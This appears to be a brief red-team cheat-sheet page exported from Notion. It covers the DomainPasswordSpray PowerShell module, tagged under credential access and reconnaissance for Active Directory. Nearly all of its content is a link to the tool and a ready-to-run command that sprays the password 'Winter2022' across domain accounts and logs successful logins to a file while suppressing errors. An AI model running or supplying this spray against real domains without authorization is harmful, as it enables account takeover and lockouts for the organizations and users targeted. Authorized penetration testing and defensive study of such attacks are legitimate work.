# Domain Password Spray PowerShell Module

OS: Active_Directory, Windows
Description: Domain Password Spray (DomainPasswordSpray.ps1) PowerShell module
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21), Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### DomainPasswordSpray

```jsx
https://github.com/dafthack/DomainPasswordSpray
```

```jsx
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```